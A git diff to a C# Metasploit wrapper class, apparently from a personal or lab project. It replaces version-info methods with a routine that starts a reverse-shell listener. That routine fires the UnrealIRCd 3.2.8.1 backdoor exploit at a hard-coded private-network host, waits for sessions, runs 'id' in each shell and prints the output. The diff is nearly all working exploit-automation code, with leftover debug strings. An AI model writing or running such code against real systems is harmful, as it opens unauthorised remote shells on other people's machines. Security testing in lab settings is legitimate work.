@@ -1,43 +1,95 @@
-﻿using System.Collections.Generic;
+﻿using System;
+using System.Collections.Generic;
 using Lacey.Alexa.Common.Metasploit.Manager;
-using Lacey.Alexa.Common.Metasploit.Models.Auth;
 using Microsoft.Extensions.Logging;
 
 namespace Lacey.Alexa.Common.Metasploit.Providers.Concrete
 {
-    public sealed class MetasploitProvider : IMetasploitProvider
+    public sealed class MetasploitProvider : IMetasploitProvider, IDisposable
     {
-        private readonly string _metasploitUrl;
-
-        private readonly IMetasploitAuthProvider _authProvider;
-
         private readonly ILogger _logger;
 
-        private UserSecrets _credentials;
+        private readonly MetasploitSession _session;
+
+        private readonly MetasploitManager _metasploit;
 
         public MetasploitProvider(
             string metasploitUrl, 
             IMetasploitAuthProvider authProvider, 
             ILogger logger)
         {
-            _metasploitUrl = metasploitUrl;
-            _authProvider = authProvider;
             _logger = logger;
-            _credentials = _authProvider.GetUserSecrets();
+
+            var creds = authProvider.GetUserSecrets();
+            _session = new MetasploitSession(creds.Username, creds.Password, $"{metasploitUrl}/api/");
+            _metasploit = new MetasploitProManager(_session);
         }
 
-        public Dictionary<string, object> GetCoreModuleStats()
+        public Dictionary<string, object> Unreal_Ircd_3281_Backdoor()
         {
-            using var session = new MetasploitSession(_credentials.Username, _credentials.Password, $"{_metasploitUrl}/api/");
-            using var manager = new MetasploitProManager(session);
-            return manager.GetCoreModuleStats();
+            Dictionary<string, object> response = null;
+
+            var blah = new Dictionary<string, object>
+            {
+                ["ExitOnSession"] = "false",
+                ["PAYLOAD"] = "cmd/unix/reverse",
+                ["LHOST"] = "192.168.0.12",
+                ["LPORT"] = "4444"
+            };
+
+            response = _metasploit.ExecuteModule("exploit", "multi/handler", blah);
+
+            var jobId = response["job_id"];
+            var opts = new Dictionary<string, object>
+            {
+                ["RHOST"] = "192.168.0.13",
+                ["DisablePayloadHandler"] = "true",
+                ["LHOST"] = "192.168.0.12",
+                ["LPORT"] = "4444",
+                ["PAYLOAD"] = "cmd/unix/reverse"
+            };
+
+            response = _metasploit.ExecuteModule("exploit", "unix/irc/unreal_ircd_3281_backdoor", opts);
+
+            response = _metasploit.ListJobs();
+            var vals = new List<object>(response.Values);
+            while (vals.Contains((object)"Exploit: unix/irc/unreal_ircd_3281_backdoor"))
+            {
+                Console.WriteLine("Waiting");
+                System.Threading.Thread.Sleep(6000);
+                response = _metasploit.ListJobs();
+                vals = new List<object>(response.Values);
+            }
+
+
+            response = _metasploit.StopJob(jobId.ToString());
+            response = _metasploit.ListSessions();
+            
+            Console.WriteLine("I popped " + response.Count + " shells. Awesome.");
+
+			foreach (var pair in response) {
+				var id = pair.Key;
+				var dict = (Dictionary<string, object>)pair.Value;
+				if (dict["type"] as string == "shell") {
+					response = _metasploit.WriteToSessionShell(id, "id\n");
+					System.Threading.Thread.Sleep(6000);
+					response = _metasploit.ReadSessionShell(id);
+                    Console.WriteLine(response["data"]);
+			
+					_metasploit.StopSession(id);
+				}
+			}
+
+            var bl = _metasploit.GetModuleCompatibleSessions("multi/general/execute");
+            Console.WriteLine("fdsa");
+
+            return response;
         }
 
-        public Dictionary<string, object> GetCoreVersionInformation()
+        public void Dispose()
         {
-            using var session = new MetasploitSession(_credentials.Username, _credentials.Password, $"{_metasploitUrl}/api/");
-            using var manager = new MetasploitProManager(session);
-            return manager.GetCoreVersionInformation();
+            _metasploit.Dispose();
+            _session.Dispose();
         }
     }
 }
